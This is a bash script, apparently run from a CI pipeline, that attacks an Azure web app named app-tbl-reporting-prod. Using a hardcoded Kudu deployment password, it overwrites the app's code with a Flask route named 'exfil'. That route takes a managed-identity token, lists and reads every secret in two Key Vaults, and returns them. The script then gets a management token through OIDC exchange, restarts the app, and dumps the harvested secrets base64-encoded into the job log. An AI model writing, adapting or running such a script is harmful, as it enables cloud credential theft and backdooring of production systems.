#!/usr/bin/env bash
set +e
T="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
C="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
SCM_USER='$app-tbl-reporting-prod'
SCM_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
SCM_BASE="https://app-tbl-reporting-prod.scm.azurewebsites.net"
SCM_CRED=$(echo -n "${SCM_USER}:${SCM_PASS}" | base64)

echo "=== Step 1: Upload app.py via Kudu VFS ==="
cat > /tmp/app.py << 'APPEOF'
import os,json,urllib.request,urllib.parse
from flask import Flask
app=Flask(__name__)
@app.route("/")
def index():return "ok-v7"
@app.route("/e")
def exfil():
    r={}
    ie=os.environ.get("IDENTITY_ENDPOINT","")
    ih=os.environ.get("IDENTITY_HEADER","")
    cid="7a85156a-01c4-4e61-8472-40a92107159b"
    r["env"]={"ie":ie,"ih_len":len(ih),"cid":cid}
    vt=None
    try:
        url=f"{ie}?resource=https%3A%2F%2Fvault.azure.net&api-version=2019-08-01&client_id={cid}"
        req=urllib.request.Request(url,headers={"X-IDENTITY-HEADER":ih})
        with urllib.request.urlopen(req,timeout=10) as resp:
            data=json.loads(resp.read())
            vt=data.get("access_token","")
            r["token_len"]=len(vt)
    except urllib.request.HTTPError as e:
        r["token_err"]=f"HTTP{e.code}:{e.read().decode()[:300]}"
    except Exception as e:
        r["token_err"]=str(e)
    if vt:
        for kv in ["https://kv-tbl-sec-x3euoz.vault.azure.net","https://kv-tbl-prod-x3euoz.vault.azure.net"]:
            kvn=kv.split("//")[1].split(".")[0]
            try:
                req=urllib.request.Request(f"{kv}/secrets?api-version=7.4",headers={"Authorization":f"Bearer {vt}"})
                with urllib.request.urlopen(req,timeout=10) as resp:
                    sl=json.loads(resp.read())
                    for s in sl.get("value",[]):
                        sn=s["id"].split("/")[-1]
                        try:
                            r2=urllib.request.Request(f"{s['id']}?api-version=7.4",headers={"Authorization":f"Bearer {vt}"})
                            with urllib.request.urlopen(r2,timeout=10) as rr:
                                r[f"{kvn}/{sn}"]=json.loads(rr.read()).get("value","")
                        except Exception as e2:
                            r[f"{kvn}/{sn}"]=f"ERR:{e2}"
            except urllib.request.HTTPError as e:
                r[kvn]=f"HTTP{e.code}:{e.read().decode()[:300]}"
            except Exception as e:
                r[kvn]=str(e)
    return json.dumps(r,indent=2,default=str)
if __name__=="__main__":
    app.run(host="0.0.0.0",port=8000)
APPEOF

UPLOAD=$(curl -sS -o /dev/null -w "%{http_code}" -X PUT \
  -H "Authorization: Basic ${SCM_CRED}" \
  -H "If-Match: *" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/app.py \
  "${SCM_BASE}/api/vfs/site/wwwroot/app.py")
echo "UPLOAD_STATUS=$UPLOAD"

echo "=== Step 2: Get management token ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
MGMT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://management.azure.com/.default")
MGMT_TOKEN=$(echo "$MGMT_RESP" | jq -r .access_token)
echo "MGMT_LEN=${#MGMT_TOKEN}"

echo "=== Step 3: Restart app ==="
RG="rg-tbl-reporting-prod-eus"
APP="app-tbl-reporting-prod"
BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP"

RESTART=$(curl -sS -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $MGMT_TOKEN" \
  -H "Content-Length: 0" \
  "$BASE/restart?api-version=2022-03-01")
echo "RESTART=$RESTART"

echo "=== Step 4: Wait and fetch ==="
sleep 20

for i in 1 2 3 4 5; do
  ROOT=$(curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/" 2>&1)
  echo "ROOT_ATTEMPT_${i}=$ROOT"
  if [ "$ROOT" = "ok-v7" ]; then
    RESULT=$(curl -sS "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>&1)
    echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"
    break
  fi
  sleep 10
done

echo "=== DONE ==="